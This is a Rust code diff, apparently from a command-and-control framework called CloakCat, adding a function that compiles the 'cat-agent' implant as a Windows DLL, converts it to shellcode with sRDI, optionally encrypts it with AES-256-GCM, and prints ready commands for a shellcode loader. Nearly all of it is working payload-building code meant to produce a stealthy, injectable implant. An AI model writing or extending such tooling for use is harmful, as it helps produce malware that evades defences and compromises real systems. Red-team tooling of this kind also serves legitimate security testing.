@@ -144,16 +144,7 @@ pub fn build_agent(args: BuildAgentArgs) -> Result<()> {
     match args.format {
         Format::Exe => build_exe(&root, &args, &cfg_json),
         Format::Dll => build_dll(&root, &args, &cfg_json),
-        Format::Shellcode => {
-            // Phase 8-3: build DLL first, then convert via sRDI.
-            build_dll(&root, &args, &cfg_json)?;
-            println!(
-                "[build-agent] NOTE: shellcode (sRDI) conversion not yet implemented — \
-                 the .dll has been placed in the output directory. \
-                 sRDI conversion will be added in Phase 8-3."
-            );
-            Ok(())
-        }
+        Format::Shellcode => build_shellcode(&root, &args, &cfg_json),
     }
 }
 
@@ -217,6 +208,99 @@ fn build_dll(root: &Path, args: &BuildAgentArgs, cfg_json: &str) -> Result<()> {
     }
 
     copy_output(&bin_path, args, ".dll")
+}
+
+fn build_shellcode(root: &Path, args: &BuildAgentArgs, cfg_json: &str) -> Result<()> {
+    use cat_agent::srdi::converter::{convert_dll_to_shellcode, SrdiFlags};
+
+    // ── Step a: compile cat-agent as a Windows DLL ─────────────────────────
+    println!("[build-agent] step 1/3 — building Windows DLL...");
+    let dll_path = root
+        .join("target")
+        .join("x86_64-pc-windows-gnu")
+        .join("release")
+        .join("cat_agent.dll");
+
+    let mut cmd = std::process::Command::new("cargo");
+    cmd.current_dir(root)
+        .env("CLOAKCAT_EMBED_CONFIG", cfg_json)
+        .arg("build")
+        .arg("-p")
+        .arg("cat-agent")
+        .arg("--lib")
+        .arg("--release")
+        .arg("--target")
+        .arg("x86_64-pc-windows-gnu")
+        .stdout(std::process::Stdio::inherit())
+        .stderr(std::process::Stdio::inherit());
+    let status = cmd.status()?;
+    if !status.success() {
+        return Err(anyhow!("cargo build --lib failed"));
+    }
+    if !dll_path.exists() {
+        return Err(anyhow!(
+            "DLL not found at {} — check cross-compile toolchain",
+            dll_path.display()
+        ));
+    }
+
+    // ── Step b: sRDI conversion ─────────────────────────────────────────────
+    println!("[build-agent] step 2/3 — converting DLL → shellcode (sRDI)...");
+    let dll_bytes = fs::read(&dll_path)?;
+    let flags = SrdiFlags {
+        clear_header: true,
+        pass_shellcode_base: false,
+    };
+    let shellcode = convert_dll_to_shellcode(&dll_bytes, flags)?;
+
+    // ── Determine output paths ─────────────────────────────────────────────
+    fs::create_dir_all(&args.output_dir)?;
+    let base_name = if args.name.ends_with(".bin") {
+        args.name.clone()
+    } else {
+        format!("{}.bin", args.name)
+    };
+
+    // ── Step c / d: optional AES-256-GCM encryption ───────────────────────
+    if args.encrypt {
+        println!("[build-agent] step 3/3 — encrypting shellcode (AES-256-GCM)...");
+        let (blob, key_hex) = encrypt_aes_gcm(&shellcode)?;
+
+        let enc_path = args.output_dir.join(format!("{}.enc", base_name));
+        let key_path = args.output_dir.join(format!("{}.key", strip_bin_ext(&args.name)));
+
+        fs::write(&enc_path, &blob)?;
+        fs::write(&key_path, &key_hex)?;
+
+        let size_kb = blob.len() / 1024;
+        println!();
+        println!("[+] Encrypted: {} ({} KB)", enc_path.display(), size_kb);
+        println!("[+] Key:       {}", key_path.display());
+        println!(
+            "[+] Run: shellcode_loader -f {} -e aes -k {} -m thread",
+            enc_path.display(),
+            key_hex
+        );
+    } else {
+        println!("[build-agent] step 3/3 — writing shellcode...");
+        let bin_path = args.output_dir.join(&base_name);
+        fs::write(&bin_path, &shellcode)?;
+
+        let size_kb = shellcode.len() / 1024;
+        println!();
+        println!("[+] Shellcode: {} ({} KB)", bin_path.display(), size_kb);
+        println!(
+            "[+] Run: shellcode_loader -f {} -m thread",
+            bin_path.display()
+        );
+    }
+
+    Ok(())
+}
+
+/// Strip a `.bin` suffix from a name, leaving everything else intact.
+fn strip_bin_ext(name: &str) -> &str {
+    name.strip_suffix(".bin").unwrap_or(name)
 }
 
 fn copy_output(bin_path: &Path, args: &BuildAgentArgs, ext: &str) -> Result<()> {
